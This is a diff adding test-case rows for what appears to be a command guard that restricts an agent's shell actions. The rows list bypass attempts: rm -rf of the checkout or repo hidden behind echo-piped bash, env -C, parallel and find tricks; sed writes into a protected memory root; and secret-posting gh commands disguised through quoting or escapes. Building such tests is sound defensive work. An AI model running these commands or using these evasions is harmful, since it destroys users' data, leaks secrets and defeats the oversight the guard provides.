+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	command sed p x.txt -e 'w {MEMORY}/a'	CRW-1063-31	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e 'w {MEMORY}/a' < /dev/null	CRW-1063-32	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e 'w {MEMORY}/a' | cat	CRW-1063-33	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -n --expression='s/a/b/w {MEMORY}/a'	CRW-1063-34	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e "w {MEMORY}/a"	CRW-1063-35	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed 'w {MEMORY}/b' x.txt -i -e p	CRW-1063-36	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e 'w {MEMORY}/a' -s	CRW-1063-37	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed -n p x.txt -s -e 'W {MEMORY}/a'	CRW-1063-38	row	-
+linear-issue-CRW-917.json	gh api --input of a clean plain text file (not JSON)	CRW-917-41-01	row	-
+linear-issue-CRW-917.json	gh api --input of a body with an unclosed JSON object	CRW-917-41-02	row	-
+linear-issue-CRW-917.json	gh api --input of a JSON document with text after it	CRW-917-41-03	row	-
+linear-issue-CRW-917.json	gh api --input with a unicode-escaped secret key	CRW-917-41-04	row	-
+linear-issue-CRW-917.json	gh pr comment --body-file of a clean plain text file (control)	CRW-917-41-05	row	-
+linear-issue-CRW-917.json	gh api -F body=@ of a clean plain text file (control)	CRW-917-41-06	row	-
+linear-issue-CRW-917.json	gh api --input of a named pipe	CRW-917-41-07	row	-
+linear-issue-CRW-917.json	g""h pr comment 1 --body 'x' (quoted program name)	CRW-917-41-08	row	-
+linear-issue-CRW-917.json	gh pr comment 1 --body-file "$F" (expansion in the file name)	CRW-917-41-09	row	-
+linear-issue-CRW-917.json	gh pr comment 1 --body-file clean.md </dev/null (glued redirect)	CRW-917-41-10	row	-
+linear-issue-CRW-917.json	gh pr create --title 'MY_API_KEY=sentinel' (secret title)	CRW-917-41-11	row	-
+linear-issue-CRW-917.json	gh pr create -t 'Plain title' --body-file clean.md (control)	CRW-917-41-12	row	-
+linear-issue-CRW-917.json	gh api --input of a JSON object whose repeated key holds a secret in its first value	CRW-917-42-01	row	-
+linear-issue-CRW-917.json	gh api --input of a repeated key with both values clean (control)	CRW-917-42-02	row	-
+linear-issue-CRW-917.json	gh pr comment --body-file of a JSON-looking file whose escape spells a secret (raw text, control)	CRW-917-42-03	row	-
+linear-issue-CRW-917.json	gh api -F body=@ of the same JSON-looking file (raw text, control)	CRW-917-42-04	row	-
+linear-issue-CRW-917.json	gh pr comment --body-file of a JSON-looking file with a raw secret	CRW-917-42-05	row	-
+linear-issue-CRW-917.json	true; python3 -c with a program that builds gh from empty quote pieces and names a post	CRW-917-42-06	row	-
+linear-issue-CRW-917.json	python3 -c with a program that names no post (control)	CRW-917-42-07	row	-
+linear-issue-CRW-917.json	gh pr comment --body-file of a JSON-looking file with a NAME=value secret inside a string	CRW-917-42-08	row	-
+linear-issue-CRW-917.json	gh pr comment --body-file of a JSON-looking file with an escaped key name (raw text, control)	CRW-917-42-09	row	-
+CRW-910 pre-merge evaluation 39c72966 (d1: second -C operand)	env -C sub -C . rm -rf ../repo	CRW-910-E01	row	-
+CRW-910 pre-merge evaluation 39c72966 (d1: second --chdir operand)	env --chdir=sub --chdir=. rm -rf ../repo	CRW-910-E02	row	-
+CRW-910 pre-merge evaluation 39c72966 (d2: find {} in env -C, memory root)	find {MEMORY} -maxdepth 0 -exec env -C '{}' sh -c 'echo x > a' \;	CRW-910-E03	row	-
+CRW-910 pre-merge evaluation 39c72966 (d2: find {} in env -C, checkout)	find {CHECKOUT} -maxdepth 0 -exec env -C '{}' rm -rf . \;	CRW-910-E04	row	-
+CRW-910 pre-merge evaluation 39c72966 (control of d2)	find . -maxdepth 0 -exec env -C sub ls \;	CRW-910-E05	row	-
+CRW-910 pre-merge evaluation 39c72966 (d3: redirect in outer dir, control)	env -C {MEMORY} ls > out.txt	CRW-910-E06	row	-
+CRW-910 pre-merge evaluation 39c72966 (d3: redirect into memory root by name)	env -C {CHECKOUT} ls > {MEMORY}/out.txt	CRW-910-E07	row	-
+CRW-910 pre-merge evaluation 39c72966 (d3: redirect in memory outer dir)	cd {MEMORY} && env -C {CHECKOUT} ls > out.txt	CRW-910-E08	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	echo -n -e 'rm -rf {CHECKOUT}' | bash	CRW-1058-26	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	echo -n -n 'echo hi' | bash	CRW-1058-27	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	echo() { printf 'rm -rf {CHECKOUT}'; }; echo ignored | bash	CRW-1058-28	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	bash - remove.sh <<<':' with remove.sh holding rm -rf {CHECKOUT}	CRW-1058-29	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	printf 'rm -rf {CHECKOUT}\n' | bash /dev/stdin <<<'echo hi'	CRW-1058-30	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	parallel -j1 cd '{}' ';' rm -rf ../repo ::: sub .	CRW-1058-31	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	parallel rm -rf '{.}' ::: ../repo.v1/../repo	CRW-1058-32	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	echo {CHECKOUT} | xargs parallel rm -rf '{}' ::: /tmp/unprotected	CRW-1058-33	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	printf 'echo hi\n' | bash >/dev/null	CRW-1058-34	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	bash /dev/stdin 3<<<'echo hi' 0<&3	CRW-1058-35	row	-
+CRW-1058 pre-merge record crw1058-e83d8ec4 (findings d1 to d9)	python3 /dev/fd/0 3<<<'print(1)' 0<&3	CRW-1058-36	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	X=$(bash lint.sh) printf "%s\n" "$(bash refresh.sh)"	CRW-1059-11	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	X=$(bash lint.sh) printf "%s\n" "$(bash refresh.sh)" with evil.sh posting	CRW-1059-12	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	X=$(bash lint.sh) printf "%s\n" "$(bash refresh.sh)" with evil.sh removing the checkout	CRW-1059-13	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	watch -x bash -c 'bash lint.sh; bash refresh.sh'	CRW-1059-14	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	watch -x bash lint.sh; bash refresh.sh	CRW-1059-15	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	watch 'bash lint.sh; bash refresh.sh'	CRW-1059-16	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	bash -c 'for ((i=0; $(bash lint.sh; echo 1) && i<2; i+=$(bash refresh.sh; echo 1))); do :; done'	CRW-1059-17	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	for ((i=0; $(bash lint.sh; echo 1) && i<2; i+=$(bash refresh.sh; echo 1))); do :; done	CRW-1059-18	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	X=$(bash refresh.sh) bash lint.sh	CRW-1059-19	row	-
+CRW-1059 evaluation of 0ef1b43d (post-evaluation round, findings d1 to d3)	X=$(bash lint.sh) bash refresh.sh	CRW-1059-20	row	-
